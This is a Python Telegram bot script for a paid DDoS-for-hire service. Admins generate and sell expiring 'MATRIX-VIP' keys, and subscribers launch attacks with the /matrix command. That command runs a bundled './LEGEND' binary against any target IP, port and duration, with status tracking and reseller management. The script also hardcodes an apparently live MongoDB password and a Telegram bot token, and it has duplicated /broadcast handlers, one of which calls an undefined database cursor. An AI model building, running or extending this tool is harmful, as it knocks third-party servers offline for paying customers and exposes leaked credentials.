#!/usr/bin/python3
import telebot
import multiprocessing
import os
import random
from datetime import datetime, timedelta
import subprocess
import sys
import time
import logging
import socket
import pytz
import pymongo
import threading
import requests
import re
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from requests.exceptions import ReadTimeout, RequestException

# MongoDB configuration
uri = "mongodb+srv://uthayakrishna67:Uthaya$0@cluster0.mlxuz.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
client = pymongo.MongoClient(uri)
db = client['telegram_bot']
users_collection = db['users']
keys_collection = db['unused_keys']

# At the beginning of your code, add this configuration
def create_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

# Initialize bot with the session
bot = telebot.TeleBot('7599785141:AAGgZ4QwNW9n1KwAOXFHtuLGlBQqM09M9UIF')
bot.session = create_session()

admin_id = ["7418099890"]
admin_owner = ["7418099890"]
os.system('chmod +x *')

IST = pytz.timezone('Asia/Kolkata')

# Store ongoing attacks globally
ongoing_attacks = []

def read_users():
    try:
        current_time = datetime.now(IST)
        users = users_collection.find({"expiration": {"$gt": current_time}})
        return {user["user_id"]: user["expiration"] for user in users}
    except Exception as e:
        logging.error(f"Error reading users: {e}")
        return {}

def clean_expired_users():
    try:
        current_time = datetime.now(IST)
        expired_users = list(users_collection.find({"expiration": {"$lt": current_time}}))
        
        for user in expired_users:
            # Notify user about expiration and provide renewal instructions
            user_message = f"""🚫 Subscription Expired
👤 User: @{user['username']}
🔑 Key: {user['key']}
⏰ Expired at: {user['expiration'].strftime('%Y-%m-%d %H:%M:%S')} IST

🛒 To renew your subscription:
1. Contact your reseller or admin.
2. Purchase a new key.
3. Use the `/redeem` command to activate it.

📢 For assistance, contact support or visit our channel: @MATRIX_CHEATS"""
            bot.send_message(user['user_id'], user_message)
            
            # Notify admin about the expired user
            admin_message = f"""🚨 Key Expired Notification
👤 User: @{user['username']}
🆔 User ID: {user['user_id']}
🔑 Key: {user['key']}
⏰ Expired at: {user['expiration'].strftime('%Y-%m-%d %H:%M:%S')} IST"""
            for admin in admin_id:
                bot.send_message(admin, admin_message)
        
        # Remove expired users from the database
        users_collection.delete_many({"expiration": {"$lt": current_time}})
    
    except Exception as e:
        logging.error(f"Error cleaning expired users: {e}")


def create_indexes():
    try:
        users_collection.create_index("user_id", unique=True)
        users_collection.create_index("expiration")
        
        keys_collection.create_index("key", unique=True)
    except Exception as e:
        logging.error(f"Error creating indexes: {e}")

        logging.error(f"Error creating indexes: {e}")

def parse_time_input(time_input):
    match = re.match(r"(\d+)([mhd])", time_input)
    if match:
        number = int(match.group(1))
        unit = match.group(2)
        
        if unit == "m":
            return timedelta(minutes=number), f"{number}m"
        elif unit == "h":
            return timedelta(hours=number), f"{number}h"
        elif unit == "d":
            return timedelta(days=number), f"{number}d"
    return None, None


@bot.message_handler(commands=['key'])
def generate_key(message):
    user_id = str(message.chat.id)
    if user_id not in admin_owner:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return

    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "📝 Usage: /key <duration>\nExample: /key 1d, /key 7d")
            return

        duration_str = args[1]
        duration, formatted_duration = parse_time_input(duration_str)
        if not duration:
            bot.reply_to(message, "❌ Invalid duration format. Use: 1d, 7d, 30d")
            return

        letters = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=4))
        numbers = ''.join(str(random.randint(0, 9)) for _ in range(4))
        key = f"MATRIX-VIP-{letters}{numbers}"

        # Insert into MongoDB
        keys_collection.insert_one({
            "key": key,
            "duration": formatted_duration,
            "created_at": datetime.now(IST),
            "is_used": False
        })

        bot.reply_to(message, f"""✅ Key Generated Successfully
🔑 Key: `{key}`
⏱ Duration: {formatted_duration}
📅 Generated: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST""")
    except Exception as e:
        bot.reply_to(message, f"❌ Error generating key: {str(e)}")



@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "📝 Usage: /redeem MATRIX-VIP-XXXX")
            return

        key = args[1].strip()
        user_id = str(message.chat.id)
        username = message.from_user.username or "Unknown"
        current_time = datetime.now(IST)

        # Check if user already has an active subscription
        existing_user = users_collection.find_one({
            "user_id": user_id,
            "expiration": {"$gt": current_time}
        })
        if existing_user:
            expiration = existing_user['expiration'].astimezone(IST)
            bot.reply_to(message, f"""⚠️ You already have an active subscription!
📅 Current subscription expires: {expiration.strftime('%Y-%m-%d %H:%M:%S')} IST
You cannot redeem a new key until your current subscription ends.""")
            return

        # Check if the key is valid and unused
        key_doc = keys_collection.find_one({"key": key, "is_used": False})
        if not key_doc:
            bot.reply_to(message, "❌ Invalid or already used key!")
            return

        # Parse duration from the key document
        duration_str = key_doc['duration']
        duration, _ = parse_time_input(duration_str)
        if not duration:
            bot.reply_to(message, "❌ Invalid key duration!")
            return

        # Calculate expiration date
        redeemed_at = datetime.now(IST)
        expiration = redeemed_at + duration

        # Add user and mark key as used
        users_collection.insert_one({
            "user_id": user_id,
            "username": username,
            "key": key,
            "redeemed_at": redeemed_at,
            "expiration": expiration
        })
        keys_collection.update_one({"key": key}, {"$set": {"is_used": True}})

        # Send success message to user
        user_message = f"""✅ Key Redeemed Successfully!
🕰️ Redeemed: {redeemed_at.strftime('%Y-%m-%d %H:%M:%S')} IST
📅 Expires: {expiration.strftime('%Y-%m-%d %H:%M:%S')} IST"""
        bot.reply_to(message, user_message)

        # Notify admin about the redemption
        admin_message = f"""🚨 Key Redeemed Notification
👤 User: @{username}
🆔 User ID: {user_id}
🔑 Key: {key}
🕰️ Redeemed At: {redeemed_at.strftime('%Y-%m-%d %H:%M:%S')} IST
📅 Expires At: {expiration.strftime('%Y-%m-%d %H:%M:%S')} IST"""
        
        for admin in admin_id:
            bot.send_message(admin, admin_message)

    except Exception as e:
        bot.reply_to(message, f"❌ Error redeeming key: {str(e)}")

@bot.message_handler(commands=['allkeys'])
def show_all_keys(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return
    
    try:
        # Aggregate unused keys with duration grouping
        keys = keys_collection.aggregate([
            {
                "$lookup": {
                    "from": "reseller_transactions",
                    "localField": "key",
                    "foreignField": "key_generated",
                    "as": "transaction"
                }
            },
            {
                "$match": {"is_used": False}
            },
            {
                "$sort": {"duration": 1, "created_at": -1}
            }
        ])
        
        if not keys:
            bot.reply_to(message, "📝 No unused keys available")
            return

        # Group keys by duration and reseller
        duration_keys = {}
        reseller_keys = {}
        total_keys = 0
        
        for key in keys:
            total_keys += 1
            duration = key['duration']
            reseller_id = key['transaction'][0]['reseller_id'] if key.get('transaction') else 'admin'
            
            if duration not in duration_keys:
                duration_keys[duration] = 0
            duration_keys[duration] += 1
            
            if reseller_id not in reseller_keys:
                reseller_keys[reseller_id] = []
                
            created_at_ist = key['created_at'].astimezone(IST).strftime('%Y-%m-%d %H:%M:%S')
            key_info = f"""🔑 Key: `{key['key']}`
⏱ Duration: {duration}
📅 Created: {created_at_ist} IST"""
            reseller_keys[reseller_id].append(key_info)

        # Build summary section
        response = f"""📊 𝗞𝗲𝘆𝘀 𝗦𝘂𝗺𝗺𝗮𝗿𝘆
━━━━━━━━━━━━━━━
📦 Total Keys: {total_keys}

⏳ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗕𝗿𝗲𝗮𝗸𝗱𝗼𝘄𝗻:"""

        for duration, count in sorted(duration_keys.items()):
            response += f"\n• {duration}: {count} keys"

        response += "\n\n🔑 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗞𝗲𝘆𝘀 𝗯𝘆 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿:\n"

        # Add reseller sections
        for reseller_id, keys_list in reseller_keys.items():
            try:
                if reseller_id == 'admin':
                    reseller_name = "Admin Generated"
                else:
                    user_info = bot.get_chat(reseller_id)
                    reseller_name = f"@{user_info.username}" if user_info.username else user_info.first_name
                
                response += f"\n👤 {reseller_name} ({len(keys_list)} keys):\n"
                response += "━━━━━━━━━━━━━━━\n"
                response += "\n\n".join(keys_list)
                response += "\n\n"
            except Exception:
                continue

        # Split response if too long
        if len(response) > 4096:
            for x in range(0, len(response), 4096):
                bot.reply_to(message, response[x:x+4096])
        else:
            bot.reply_to(message, response)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error fetching keys: {str(e)}")



@bot.message_handler(commands=['allusers'])
def show_users(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return
        
    try:
        current_time = datetime.now(IST)
        
        # Aggregate users with reseller info and sort by expiration
        users = users_collection.aggregate([
            {
                "$match": {
                    "expiration": {"$gt": current_time}
                }
            },
            {
                "$lookup": {
                    "from": "reseller_transactions",
                    "localField": "key",
                    "foreignField": "key_generated",
                    "as": "transaction"
                }
            },
            {
                "$sort": {
                    "expiration": 1
                }
            }
        ])
        
        if not users:
            bot.reply_to(message, "📝 No active users found")
            return

        # Group users by reseller
        reseller_users = {}
        total_users = 0
        
        for user in users:
            reseller_id = user['transaction'][0]['reseller_id'] if user.get('transaction') else 'admin'
            if reseller_id not in reseller_users:
                reseller_users[reseller_id] = []
                
            remaining = user['expiration'].astimezone(IST) - current_time
            expiration_ist = user['expiration'].astimezone(IST).strftime('%Y-%m-%d %H:%M:%S')
            
            user_info = f"""👤 User: @{user.get('username', 'N/A')}
🆔 ID: `{user['user_id']}`
🔑 Key: `{user['key']}`
⏳ Remaining: {remaining.days}d {remaining.seconds // 3600}h
📅 Expires: {expiration_ist} IST"""
            reseller_users[reseller_id].append(user_info)
            total_users += 1

        # Build response message
        response = f"👥 Active Users: {total_users}\n\n"
        
        for reseller_id, users_list in reseller_users.items():
            try:
                if reseller_id == 'admin':
                    reseller_name = "Admin Generated"
                else:
                    user_info = bot.get_chat(reseller_id)
                    reseller_name = f"@{user_info.username}" if user_info.username else user_info.first_name
                    
                response += f"👤 {reseller_name} ({len(users_list)} users):\n"
                response += "━━━━━━━━━━━━━━━\n"
                response += "\n\n".join(users_list)
                response += "\n\n"
            except Exception:
                continue

        # Split response if too long
        if len(response) > 4096:
            for x in range(0, len(response), 4096):
                bot.reply_to(message, response[x:x+4096])
        else:
            bot.reply_to(message, response)
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error fetching users: {str(e)}")


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return
        
    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "📝 Usage: /broadcast <message>")
        return
        
    broadcast_text = args[1]
    
    try:
        current_time = datetime.now(IST)
        users = list(users_collection.find({"expiration": {"$gt": current_time}}))
        
        if not users:
            bot.reply_to(message, "❌ No active users found to broadcast to.")
            return
            
        success_count = 0
        failed_users = []
        
        for user in users:
            try:
                formatted_message = f"""
📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘
{broadcast_text}
━━━━━━━━━━━━━━━
𝗦𝗲𝗻𝘁 𝗯𝘆: @{message.from_user.username}
𝗧𝗶𝗺𝗲: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST"""

                bot.send_message(user['user_id'], formatted_message)
                success_count += 1
                time.sleep(0.1)  # Prevent flooding
                
            except Exception as e:
                failed_users.append(f"@{user['username']}")
        
        summary = f"""
✅ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗦𝘂𝗺𝗺𝗮𝗿𝘆:
📨 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {len(users)}
✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹: {success_count}
❌ 𝗙𝗮𝗶𝗹𝗲𝗱: {len(failed_users)}"""

        if failed_users:
            summary += "\n❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘂𝘀𝗲𝗿𝘀:\n" + "\n".join(failed_users)
            
        bot.reply_to(message, summary)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error during broadcast: {str(e)}")

@bot.message_handler(commands=['remove'])
def remove_key(message):
    user_id = str(message.chat.id)
    if user_id not in admin_owner:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return

    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "📝 Usage: /remove <key>")
            return

        key = args[1]
        removed_from = []

        # Remove from unused keys collection
        result = keys_collection.delete_one({"key": key})
        if result.deleted_count > 0:
            removed_from.append("unused keys database")

        # Find and remove from users collection
        user = users_collection.find_one({"key": key})
        if user:
            # Send notification to the user
            user_notification = f"""
🚫 𝗞𝗲𝘆 𝗥𝗲𝘃𝗼𝗸𝗲𝗱
Your license key has been revoked by an administrator.
🔑 Key: {key}
⏰ Revoked at: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST

📢 For support or to purchase a new key:
• Contact any admin or reseller
• Visit @MATRIX_CHEATS
"""
            try:
                bot.send_message(user['user_id'], user_notification)
            except Exception as e:
                logging.error(f"Failed to notify user {user['user_id']}: {e}")

            # Remove from users collection
            users_collection.delete_one({"key": key})
            removed_from.append("active users database")

        if not removed_from:
            bot.reply_to(message, f"""
❌ 𝗞𝗲𝘆 𝗡𝗼𝘁 𝗙𝗼𝘂𝗻𝗱
The key {key} was not found in any database.
""")
            return

        # Send success message to admin
        admin_message = f"""
✅ 𝗞𝗲𝘆 𝗥𝗲𝗺𝗼𝘃𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
🔑 Key: {key}
📊 Removed from: {', '.join(removed_from)}
⏰ Time: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
"""
        if user:
            admin_message += f"""
👤 User Details:
• Username: @{user.get('username', 'N/A')}
• User ID: {user['user_id']}
"""
        bot.reply_to(message, admin_message)

    except Exception as e:
        error_message = f"""
❌ 𝗘𝗿𝗿𝗼𝗿 𝗥𝗲𝗺𝗼𝘃𝗶𝗻𝗴 𝗞𝗲𝘆
⚠️ Error: {str(e)}
"""
        logging.error(f"Error removing key: {e}")
        bot.reply_to(message, error_message)


ongoing_attacks = []
attack_cooldown = {}

def start_attack_reply(message, target, port, time):
    username = message.from_user.username if message.from_user.username else message.from_user.first_name
    user_id = message.from_user.id
    start_time = datetime.now(IST)
    
    # Add attack to ongoing attacks list
    attack_info = {
        'user': username,
        'user_id': user_id,
        'target': target,
        'port': port,
        'time': time,
        'start_time': start_time
    }
    ongoing_attacks.append(attack_info)
    
    try:
        # Send initial message to user
        user_response = f"""
🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!
👤 𝗨𝘀𝗲𝗿: {username}
🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
🔌 𝗣𝗼𝗿𝘁: {port}
⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} seconds
📅 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {start_time.strftime('%H:%M:%S')} IST
⚡️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀...
"""
        bot.reply_to(message, user_response)
        
        # Execute attack in a separate thread
        attack_thread = threading.Thread(target=execute_attack, args=(message, target, port, time, attack_info))
        attack_thread.start()
        
    except Exception as e:
        ongoing_attacks.remove(attack_info)
        bot.reply_to(message, f"❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟𝗘𝗗\n⚠️ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")

def execute_attack(message, target, port, time, attack_info):
    try:
        # Execute attack in a separate process instead of shell command
        attack_process = subprocess.Popen(
            ["./LEGEND", target, str(port), str(time)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for process to complete
        attack_process.wait()
        
        # Calculate attack duration
        end_time = datetime.now(IST)
        duration = (end_time - attack_info['start_time']).total_seconds()
        
        # Remove from ongoing attacks
        ongoing_attacks.remove(attack_info)
        
        # Send completion message
        completion_msg = f"""
✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗
⏱️ 𝗔𝗰𝘁𝘂𝗮𝗹 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {int(duration)} seconds
📅 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱: {end_time.strftime('%H:%M:%S')} IST
"""
        bot.reply_to(message, completion_msg)
        
    except Exception as e:
        ongoing_attacks.remove(attack_info)
        bot.reply_to(message, f"❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟𝗘𝗗\n⚠️ 𝗘𝗿𝗿𝗼𝗿: {str(e)}")


# At the top of the file, modify the ongoing_attacks list to a counter
MAX_CONCURRENT_ATTACKS = 1
ongoing_attacks = []

@bot.message_handler(commands=['matrix'])
def handle_matrix(message):
    user_id = str(message.chat.id)
    users = read_users()
    
    # Check if user is authorized
    if user_id not in admin_owner and user_id not in users:
        bot.reply_to(message, "⛔️ Unauthorized Access")
        return
        
    # Check for concurrent attack limit
    if len(ongoing_attacks) >= MAX_CONCURRENT_ATTACKS:
        bot.reply_to(message, f"⚠️ Maximum concurrent attacks limit ({MAX_CONCURRENT_ATTACKS}) reached. Please wait.")
        return
        
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "📝 Usage: /matrix <target> <port> <time>")
        return
        
    try:
        target = args[1]
        port = int(args[2])
        time = int(args[3])
        
        # Validate time limit for non-admin users
        if user_id not in admin_owner and time > 180:
            bot.reply_to(message, "⚠️ Maximum attack time is 180 seconds.")
            return
            
        # Start the attack
        start_attack_reply(message, target, port, time)
        
    except ValueError:
        bot.reply_to(message, "❌ Error: Port and time must be numbers.")

# Previous attack handling code remains the same
ongoing_attacks = []

@bot.message_handler(commands=['status'])
def show_status(message):
    user_id = str(message.chat.id)
    users = read_users()
    
    # Check if user is authorized
    if user_id not in admin_owner and user_id not in users:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")
        return

    if not ongoing_attacks:
        bot.reply_to(message, "📊 𝗦𝘁𝗮𝘁𝘂𝘀: No ongoing attacks")
        return

    current_time = datetime.now(IST)
    
    # Different views for admin and regular users
    if user_id in admin_owner:
        # Detailed admin view
        response = "📊 𝗗𝗲𝘁𝗮𝗶𝗹𝗲𝗱 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝘁𝘂𝘀:\n\n"
        for attack in ongoing_attacks:
            elapsed = (current_time - attack['start_time']).total_seconds()
            remaining = max(0, attack['time'] - int(elapsed))
            progress = min(100, (elapsed / attack['time']) * 100)
            
            response += (
                f"👤 𝗨𝘀𝗲𝗿: @{attack['user']} (ID: {attack['user_id']})\n"
                f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {attack['target']}\n"
                f"🔌 𝗣𝗼𝗿𝘁: {attack['port']}\n"
                f"⏱️ 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲: {attack['time']} seconds\n"
                f"⌛️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining} seconds\n"
                f"📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {progress:.1f}%\n"
                f"📅 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {attack['start_time'].strftime('%Y-%m-%d %H:%M:%S')} IST\n"
                f"🔄 𝗘𝗹𝗮𝗽𝘀𝗲𝗱: {int(elapsed)} seconds\n"
                "━━━━━━━━━━━━━━━\n"
            )
    else:
        # Simple user view
        response = "📊 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝘁𝘂𝘀:\n\n"
        for attack in ongoing_attacks:
            elapsed = (current_time - attack['start_time']).total_seconds()
            remaining = max(0, attack['time'] - int(elapsed))
            progress = min(100, (elapsed / attack['time']) * 100)
            
            response += (
                f"⏳ 𝗦𝘁𝗮𝘁𝘂𝘀: Attack in Progress\n"
                f"⌛️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining} seconds\n"
                f"📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {progress:.1f}%\n"
                "━━━━━━━━━━━━━━━\n"
                "⚠️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝗳𝗼𝗿 𝘁𝗵𝗲 𝗰𝘂𝗿𝗿𝗲𝗻𝘁\n"
                "𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 𝗳𝗶𝗻𝗶𝘀𝗵\n"
            )

    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: Admin only command")
        return

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "📝 𝗨𝘀𝗮𝗴𝗲: /broadcast <message>")
        return

    broadcast_text = args[1]
    try:
        # Get all active users
        cursor.execute("""
            SELECT user_id, username 
            FROM users 
            WHERE expiration > NOW()
            ORDER BY username
        """)
        users = cursor.fetchall()

        if not users:
            bot.reply_to(message, "❌ No active users found to broadcast to.")
            return

        # Track successful and failed broadcasts
        success_count = 0
        failed_users = []

        # Send message to each user
        for user_id, username in users:
            try:
                formatted_message = f"""
📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘

{broadcast_text}

━━━━━━━━━━━━━━━
𝗦𝗲𝗻𝘁 𝗯𝘆: @{message.from_user.username}
𝗧𝗶𝗺𝗲: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
"""
                bot.send_message(user_id, formatted_message)
                success_count += 1
                time.sleep(0.1)  # Prevent flooding
            except Exception as e:
                failed_users.append(f"@{username}")
                logging.error(f"Failed to send broadcast to {username} ({user_id}): {e}")

        # Send summary to admin
        summary = f"""
✅ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗦𝘂𝗺𝗺𝗮𝗿𝘆:

📨 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {len(users)}
✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹: {success_count}
❌ 𝗙𝗮𝗶𝗹𝗲𝗱: {len(failed_users)}
"""
        if failed_users:
            summary += f"\n❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘂𝘀𝗲𝗿𝘀:\n" + "\n".join(failed_users)

        bot.reply_to(message, summary)

    except Exception as e:
        logging.error(f"Broadcast error: {e}")
        bot.reply_to(message, f"❌ Error during broadcast: {str(e)}")

    
@bot.message_handler(commands=['start'])
def welcome_start(message):
    try:
        user_id = str(message.chat.id)
        users = read_users()
        
        if user_id in users or user_id in admin_id:
            help_text = '''
📚 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:

🎯 𝗨𝗦𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
• /matrix - 𝗘𝘅𝗲𝗰𝘂𝘁𝗲 𝗮𝘁𝘁𝗮𝗰𝗸
• /status - 𝗖𝗵𝗲𝗰𝗸 𝗮𝘁𝘁𝗮𝗰𝗸 𝘀𝘁𝗮𝘁𝘂𝘀
• /redeem - 𝗥𝗲𝗱𝗲𝗲𝗺 𝗮 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆'''

            if user_id in admin_id:
                help_text += '''

👑 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
• /key - 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆
• /allkeys - 𝗩𝗶𝗲𝘄 𝗮𝗹𝗹 𝗸𝗲𝘆𝘀
• /allusers - 𝗩𝗶𝗲𝘄 𝗮𝗰𝘁𝗶𝘃𝗲 𝘂𝘀𝗲𝗿𝘀
• /broadcast - 𝗦𝗲𝗻𝗱 𝗺𝗮𝘀𝘀 𝗺𝗲𝘀𝘀𝗮𝗴𝗲
• /remove - 𝗥𝗲𝗺𝗼𝘃𝗲 𝗮 𝗸𝗲𝘆'''

            help_text += '''

📢 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟:
➡️ @MATRIX_CHEATS
'''
            
            bot.reply_to(message, help_text)
        else:
            unauthorized_text = '''⛔️ 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀
🛒 𝗧𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲 𝗮𝗻 𝗮𝗰𝗰𝗲𝘀𝘀 𝗸𝗲𝘆:
• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗮𝗻𝘆 𝗮𝗱𝗺𝗶𝗻 𝗼𝗿 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿

📢 𝗖𝗛𝗔𝗡𝗡𝗘𝗟:
➡️ @MATRIX_CHEATS'''
            bot.reply_to(message, unauthorized_text)
            
    except Exception as e:
        logging.error(f"Error in /help command: {e}")
        bot.reply_to(message, "❌ 𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")


# Handler for broadcasting a message
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            users = read_users()  # Get users from Redis
            if users:
                for user in users:
                    try:
                        bot.send_message(user, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user}: {str(e)}")
                response = "Broadcast Message Sent Successfully To All Users."
            else:
                response = "No users found in the system."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

import threading

def cleanup_thread():
    while True:
        clean_expired_users()
        time.sleep(60)  # Check every minute

# Start the cleanup thread
cleanup_thread = threading.Thread(target=cleanup_thread, daemon=True)
cleanup_thread.start()

def cleanup_task():
    while True:
        clean_expired_users()
        time.sleep(60)  # Check every minute

def run_bot():
    create_indexes()
    # Start the cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_task, daemon=True)
    cleanup_thread.start()
    
    while True:
        try:
            print("Bot is running...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except (ReadTimeout, RequestException) as e:
            logging.error(f"Connection error: {e}")
            time.sleep(15)
        except Exception as e:
            logging.error(f"Bot error: {e}")
            time.sleep(15)

if __name__ == "__main__":
    run_bot()
